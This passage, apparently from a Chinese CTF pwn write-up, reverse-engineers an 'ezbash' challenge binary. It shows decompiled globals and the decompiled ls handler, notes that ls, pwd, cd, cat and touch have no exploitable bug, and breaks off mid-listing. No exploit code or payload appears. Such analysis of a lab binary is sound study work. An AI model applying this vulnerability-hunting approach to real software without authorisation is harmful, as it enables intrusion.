&lt;p&gt;程序会使用 2 个全局变量记录我们的当前位置，一个是我们所在的文件夹的指针，一个是字符串记录的是从 home 到当前位置的路径的名字。&lt;/p&gt;
&lt;figure class=&#34;highlight c&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;.bss:&lt;span class=&#34;number&#34;&gt;0000000000006140&lt;/span&gt; cur_position_addr db &lt;span class=&#34;number&#34;&gt;50&lt;/span&gt;h &lt;span class=&#34;title function_&#34;&gt;dup&lt;/span&gt;&lt;span class=&#34;params&#34;&gt;(?)&lt;/span&gt;         ; DATA XREF: apwd+&lt;span class=&#34;number&#34;&gt;10&lt;/span&gt;↑o&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;.bss:&lt;span class=&#34;number&#34;&gt;0000000000006140&lt;/span&gt;                                         ; acd+&lt;span class=&#34;number&#34;&gt;10F&lt;/span&gt;↑o ...&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;.bss:&lt;span class=&#34;number&#34;&gt;0000000000006190&lt;/span&gt; ; file *cuurr_pos&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;.bss:&lt;span class=&#34;number&#34;&gt;0000000000006190&lt;/span&gt; cuurr_pos       dq ?                    ; DATA XREF: unlink:loc_15F0↑r&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;其实真正利用的命令没有多少，ls，pwd，help，exit，cd，cat，touch, 都没有漏洞的利用。&lt;/p&gt;
&lt;h4 id=&#34;ls&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#ls&#34;&gt;#&lt;/a&gt; ls&lt;/h4&gt;
&lt;p&gt;列出当前文件夹下的内容，或者以及子文件夹的内容，成灰只可以识别到以及子文件夹，对于 A/B, 成为程序人为这是一个 file 的名称，而不是一条路径。但是./A 是有效的，程序会识别./ 为当前目录。&lt;/p&gt;
&lt;figure class=&#34;highlight c&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;28&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;29&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;30&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;31&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;32&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;33&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;34&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;35&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;36&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;37&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;38&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;39&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;40&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;41&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;42&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;43&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;44&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;45&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;46&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;47&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;48&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;49&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;50&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;51&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;52&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;53&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;54&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;55&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;56&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;57&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;58&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;59&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;60&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;61&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;62&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;63&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;64&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;65&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;66&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;67&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;68&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;69&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;70&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;71&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;72&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;73&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;74&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;75&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;76&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;77&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;78&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;79&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;80&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;81&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;82&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;83&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;84&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;85&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;86&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;87&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;88&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;89&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;90&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;91&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;92&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;93&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;94&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;95&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;96&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;97&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;98&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;99&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;100&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;101&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;102&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;103&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;104&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;105&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;106&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;107&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;108&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;109&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;110&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;111&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;112&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;113&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;114&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;115&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;116&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;117&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;118&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;119&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;120&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;121&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;122&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;123&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;__int64 __fastcall &lt;span class=&#34;title function_&#34;&gt;als&lt;/span&gt;&lt;span class=&#34;params&#34;&gt;(&lt;span class=&#34;type&#34;&gt;const&lt;/span&gt; &lt;span class=&#34;type&#34;&gt;char&lt;/span&gt; **cmd, __int64 a2)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; v2; &lt;span class=&#34;comment&#34;&gt;// eax&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;type&#34;&gt;unsigned&lt;/span&gt; __int64 v3; &lt;span class=&#34;comment&#34;&gt;// rax&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;type&#34;&gt;void&lt;/span&gt; *v4; &lt;span class=&#34;comment&#34;&gt;// rsp&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; v6; &lt;span class=&#34;comment&#34;&gt;// eax&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  __int64 v7; &lt;span class=&#34;comment&#34;&gt;// rbx&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;type&#34;&gt;size_t&lt;/span&gt; v8; &lt;span class=&#34;comment&#34;&gt;// rax&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; v9; &lt;span class=&#34;comment&#34;&gt;// eax&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  __int64 v10[&lt;span class=&#34;number&#34;&gt;3&lt;/span&gt;]; &lt;span class=&#34;comment&#34;&gt;// [rsp+8h] [rbp-A0h] BYREF&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;type&#34;&gt;const&lt;/span&gt; &lt;span class=&#34;type&#34;&gt;char&lt;/span&gt; **comment; &lt;span class=&#34;comment&#34;&gt;// [rsp+20h] [rbp-88h]&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;type&#34;&gt;char&lt;/span&gt; v12; &lt;span class=&#34;comment&#34;&gt;// [rsp+37h] [rbp-71h]&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; v13; &lt;span class=&#34;comment&#34;&gt;// [rsp+38h] [rbp-70h]&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; v14; &lt;span class=&#34;comment&#34;&gt;// [rsp+3Ch] [rbp-6Ch]&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; nums; &lt;span class=&#34;comment&#34;&gt;// [rsp+40h] [rbp-68h]&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; v16; &lt;span class=&#34;comment&#34;&gt;// [rsp+44h] [rbp-64h]&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  file *v17; &lt;span class=&#34;comment&#34;&gt;// [rsp+48h] [rbp-60h] BYREF&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;type&#34;&gt;char&lt;/span&gt; *s1; &lt;span class=&#34;comment&#34;&gt;// [rsp+50h] [rbp-58h]&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  file *v19; &lt;span class=&#34;comment&#34;&gt;// [rsp+58h] [rbp-50h]&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  __int64 v20; &lt;span class=&#34;comment&#34;&gt;// [rsp+60h] [rbp-48h]&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  __int64 v21; &lt;span class=&#34;comment&#34;&gt;// [rsp+68h] [rbp-40h]&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;type&#34;&gt;char&lt;/span&gt; *dest; &lt;span class=&#34;comment&#34;&gt;// [rsp+70h] [rbp-38h]&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;type&#34;&gt;char&lt;/span&gt; delim[&lt;span class=&#34;number&#34;&gt;2&lt;/span&gt;]; &lt;span class=&#34;comment&#34;&gt;// [rsp+7Eh] [rbp-2Ah] BYREF&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;type&#34;&gt;unsigned&lt;/span&gt; __int64 v24; &lt;span class=&#34;comment&#34;&gt;// [rsp+80h] [rbp-28h]&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  comment = cmd;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  v24 = __readfsqword(&lt;span class=&#34;number&#34;&gt;0x28&lt;/span&gt;u);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  v17 = cuurr_pos-&amp;gt;firstson;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  v19 = cuurr_pos;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  v20 = &lt;span class=&#34;number&#34;&gt;0LL&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  v12 = &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  nums = &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;built_in&#34;&gt;strcpy&lt;/span&gt;(delim, &lt;span class=&#34;string&#34;&gt;&amp;quot;/&amp;quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;keyword&#34;&gt;while&lt;/span&gt; ( comment[++nums] )                     &lt;span class=&#34;comment&#34;&gt;// 只有ls 就会跳过&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; ( &lt;span class=&#34;built_in&#34;&gt;strlen&lt;/span&gt;(comment[nums]) &amp;lt;= v14 )&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      v2 = v14;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;else&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      v2 = &lt;span class=&#34;built_in&#34;&gt;strlen&lt;/span&gt;(comment[nums]) + &lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    v14 = v2;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  v21 = v14 - &lt;span class=&#34;number&#34;&gt;1LL&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  v10[&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;] = v14;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  v10[&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;] = &lt;span class=&#34;number&#34;&gt;0LL&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  v3 = &lt;span class=&#34;number&#34;&gt;16&lt;/span&gt; * ((v14 + &lt;span class=&#34;number&#34;&gt;15LL&lt;/span&gt;) / &lt;span class=&#34;number&#34;&gt;0x10&lt;/span&gt;uLL);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;keyword&#34;&gt;while&lt;/span&gt; ( v10 != (v10 - (v3 &amp;amp; &lt;span class=&#34;number&#34;&gt;0xFFFFFFFFFFFFF000&lt;/span&gt;LL)) )&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    ;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  v4 = alloca(v3 &amp;amp; &lt;span class=&#34;number&#34;&gt;0xFFF&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; ( (v3 &amp;amp; &lt;span class=&#34;number&#34;&gt;0xFFF&lt;/span&gt;) != &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt; )&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    *(&amp;amp;v10[&lt;span class=&#34;number&#34;&gt;-1&lt;/span&gt;] + (v3 &amp;amp; &lt;span class=&#34;number&#34;&gt;0xFFF&lt;/span&gt;)) = *(&amp;amp;v10[&lt;span class=&#34;number&#34;&gt;-1&lt;/span&gt;] + (v3 &amp;amp; &lt;span class=&#34;number&#34;&gt;0xFFF&lt;/span&gt;));&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  dest = v10;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  v16 = nums - &lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; ( nums == &lt;span class=&#34;number&#34;&gt;1&lt;/span&gt; )&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    info_ls();&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;1LL&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  nums = &lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;LABEL_44:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; ( nums &amp;lt;= v16 )&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    v14 = &lt;span class=&#34;built_in&#34;&gt;strlen&lt;/span&gt;(comment[nums]);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    v13 = &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;built_in&#34;&gt;strcpy&lt;/span&gt;(dest, comment[nums]);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;for&lt;/span&gt; ( s1 = strtok(dest, delim); ; s1 = strtok(&lt;span class=&#34;number&#34;&gt;0LL&lt;/span&gt;, delim) )&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; ( !s1 )&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;LABEL_43:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        cuurr_pos = v19;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        ++nums;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;goto&lt;/span&gt; LABEL_44;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      v17 = cuurr_pos-&amp;gt;firstson;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; ( !&lt;span class=&#34;built_in&#34;&gt;strcmp&lt;/span&gt;(s1, &lt;span class=&#34;string&#34;&gt;&amp;quot;.&amp;quot;&lt;/span&gt;) )&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;goto&lt;/span&gt; LABEL_16;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; ( !&lt;span class=&#34;built_in&#34;&gt;strcmp&lt;/span&gt;(s1, off_4077) )&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;break&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      v12 = findfile(&amp;amp;v17, s1);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; ( v12 != &lt;span class=&#34;number&#34;&gt;1&lt;/span&gt; )&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;built_in&#34;&gt;fprintf&lt;/span&gt;(&lt;span class=&#34;built_in&#34;&gt;stderr&lt;/span&gt;, &lt;span class=&#34;string&#34;&gt;&amp;quot;ezbash: cannot access &amp;#x27;%s&amp;#x27;: No such file or directory\n&amp;quot;&lt;/span&gt;, s1);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;goto&lt;/span&gt; LABEL_43;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; ( checkfile(v17) )&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        v7 = v14;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        v8 = &lt;span class=&#34;built_in&#34;&gt;strlen&lt;/span&gt;(s1);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; ( !&lt;span class=&#34;built_in&#34;&gt;strcmp&lt;/span&gt;(&amp;amp;dest[v7 - v8], s1) )&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;          &lt;span class=&#34;built_in&#34;&gt;puts&lt;/span&gt;(v17-&amp;gt;name);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;else&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;          &lt;span class=&#34;built_in&#34;&gt;fprintf&lt;/span&gt;(&lt;span class=&#34;built_in&#34;&gt;stderr&lt;/span&gt;, &lt;span class=&#34;string&#34;&gt;&amp;quot;ezbash: cannot access &amp;#x27;%s&amp;#x27;: Not a directory\n&amp;quot;&lt;/span&gt;, comment[nums]);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; ( v16 &amp;gt; &lt;span class=&#34;number&#34;&gt;1&lt;/span&gt; &amp;amp;&amp;amp; nums &amp;lt; v16 )&lt;/span&gt;&lt;br&gt;&lt;span 